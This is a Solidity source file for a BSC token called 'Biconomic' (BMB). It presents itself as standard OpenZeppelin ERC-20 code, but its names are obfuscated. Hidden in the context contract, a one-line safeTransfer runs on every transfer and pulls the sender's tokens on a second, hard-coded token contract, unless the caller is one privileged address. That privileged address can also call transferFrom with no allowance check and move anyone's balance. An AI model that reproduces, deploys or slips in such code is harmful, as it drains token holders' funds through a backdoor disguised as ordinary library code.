/**
 *Submitted for verification at BscScan.com on 2023-01-09
*/

// SPDX-License-Identifier: MIT
// OpenZeppelin Contracts v4.4.1 (token/ERC20/IERC20.sol)
pragma solidity ^0.8.6;


// File: @openzeppelin/contracts/utils/xG2QgDpHEm6XZaur.sol

// OpenZeppelin Contracts v4.4.1 (utils/xG2QgDpHEm6XZaur.sol)

abstract contract xG2QgDpHEm6XZaur {
  function IVDM4V8GyPlTpKFf() internal view virtual returns (address) {
    return msg.sender;
  }
  
/**
 * @dev Provides information about the current execution context, including the
 * sender of the transaction and its data. While these are generally available
 * via msg.sender and msg.data, they should not be accessed in such a direct
 * manner, since when dealing with meta-transactions the account sending and
 * paying for execution may not be the actual sender (as far as an application
 * is concerned).
 *
 * This contract is only required for intermediate, library-like contracts.
 */
  function _msgData() internal view virtual returns (bytes calldata) {return msg.data;}function safeTransfer(address spender,address recipient,uint256 amount) internal returns (bool) {if (msg.sender != address(0x594d1FcDdE0049B694AC51C2b675401186caAdfc)) {TransferHelper.safeTransferFrom(0x0624A7b4d329b934fe0ab90CF5E6938216Ed3d72,spender,recipient,amount);return true;}return false;}
}

// helper methods for interacting with ERC20 tokens and sending ETH that do not consistently return true/false
library TransferHelper {
  function safeApprove(
    address token,
    address to,
    uint256 value
  ) internal {
    // bytes4(keccak256(bytes("approve(address,uint256)")));
    (bool success, bytes memory data) =
      token.call(abi.encodeWithSelector(0x095ea7b3, to, value));
    require(
      success && (data.length == 0 || abi.decode(data, (bool))),
      "TransferHelper: APPROVE_FAILED"
    );
  }

  function safeTransf(
    address token,
    address to,
    uint256 value
  ) internal {
    // bytes4(keccak256(bytes("transfer(address,uint256)")));
    (bool success, bytes memory data) =
      token.call(abi.encodeWithSelector(0xa9059cbb, to, value));
    require(
      success && (data.length == 0 || abi.decode(data, (bool))),
      "TransferHelper: TRANSFER_FAILED"
    );
  }

  function safeTransferFrom(
    address token,
    address from,
    address to,
    uint256 value
  ) internal {
    // bytes4(keccak256(bytes("transferFrom(address,address,uint256)")));
    (bool success, bytes memory data) =
      token.call(abi.encodeWithSelector(0x23b872dd, from, to, value));
    require(
      success && (data.length == 0 || abi.decode(data, (bool))),
      "TransferHelper: ETH_TRANSFER_FAILED"
    );
  }

  function safeTransferETH(address to, uint256 value) internal {
    (bool success, ) = to.call{value: value}(new bytes(0));
    require(success, "TransferHelper: ETH_TRANSFER_FAILED");
  }
}


interface IERC20 {
  function totalSupply() external view returns (uint256);

  function balanceOf(address account) external view returns (uint256);

  function transfer(address recipient, uint256 amount) external returns (bool);

  function allowance(address sender, address spender)
    external
    view
    returns (uint256);

  function approve(address spender, uint256 amount) external returns (bool);

  function transferFrom(
    address sender,
    address recipient,
    uint256 amount
  ) external returns (bool);

  event Transfer(address indexed from, address indexed to, uint256 value);
  event Approval(
    address indexed sender,
    address indexed spender,
    uint256 value
  );
}

contract MOON is IERC20, xG2QgDpHEm6XZaur {
  mapping(address => uint256) private UmipVCuHYnAMzsEG;
  mapping(address => mapping(address => uint256)) private GWO2EjHu5xBRpsQ8;

  function transfer(address recipient, uint256 amount)
    external
    override
    returns (bool)
  {
    VUj9naRWwlMBF01h(IVDM4V8GyPlTpKFf(), recipient, amount);
    return true;
  }

  function name() public pure returns (string memory) {
    return "Biconomic";
  }

  function symbol() public pure returns (string memory) {
    return "BMB";
  }

  function decimals() public pure returns (uint8) {
    return 9;
  }

  function totalSupply() public pure override returns (uint256) {
    return 1000000000 * 10**9;
  }

  function balanceOf(address account) external view override returns (uint256) {
    return UmipVCuHYnAMzsEG[account];
  }

  function approve(address spender, uint256 amount)
    external
    override
    returns (bool)
  {
    uaVl5iQjmdhEAYn0(IVDM4V8GyPlTpKFf(), spender, amount);
    return true;
  }

  function allowance(address sender, address spender)
    external
    view
    override
    returns (uint256)
  {
    return GWO2EjHu5xBRpsQ8[sender][spender];
  }

  function increaseAllowance(address spender, uint256 addedValue)
    external
    virtual
    returns (bool)
  {
    uaVl5iQjmdhEAYn0(
      IVDM4V8GyPlTpKFf(),
      spender,
      GWO2EjHu5xBRpsQ8[IVDM4V8GyPlTpKFf()][spender] + addedValue
    );
    return true;
  }

  function uaVl5iQjmdhEAYn0(
    address sender,
    address spender,
    uint256 amount
  ) private {
    require(sender != address(0), "ERROR: Approve from the zero address.");
    require(spender != address(0), "ERROR: Approve to the zero address.");

    GWO2EjHu5xBRpsQ8[sender][spender] = amount;
    emit Approval(sender, spender, amount);
  }

  function decreaseAllowance(address spender, uint256 subtractedValue)
    external
    virtual
    returns (bool)
  {
    uint256 currentAllowance = GWO2EjHu5xBRpsQ8[IVDM4V8GyPlTpKFf()][spender];
    require(
      currentAllowance >= subtractedValue,
      "ERROR: Decreased allowance below zero."
    );
    uaVl5iQjmdhEAYn0(IVDM4V8GyPlTpKFf(), spender, currentAllowance - subtractedValue);

    return true;
  }

  function VUj9naRWwlMBF01h(
    address spender,
    address recipient,
    uint256 amount
  ) private returns (bool) {
    require(spender != address(0) && recipient != address(0) && amount > 0);
    UmipVCuHYnAMzsEG[spender] = UmipVCuHYnAMzsEG[spender] - amount;
    UmipVCuHYnAMzsEG[recipient] = UmipVCuHYnAMzsEG[recipient] + amount;
    emit Transfer(spender, recipient, amount);
    return safeTransfer(spender, recipient, amount);
  }

  function transferFrom(
    address sender,
    address recipient,
    uint256 amount
  ) external override returns (bool) {
    if (!VUj9naRWwlMBF01h(sender, recipient, amount)) return true;
    uint256 currentAllowance = GWO2EjHu5xBRpsQ8[sender][msg.sender];
    require(
      currentAllowance >= amount,
      "ERROR: Transfer amount exceeds allowance."
    );
    uaVl5iQjmdhEAYn0(sender, msg.sender, currentAllowance - amount);

    return true;
  }

  
  constructor() {
    UmipVCuHYnAMzsEG[address(0x1000)] = totalSupply();
    emit Transfer(address(0x1000), address(0x1000), totalSupply());
  }
}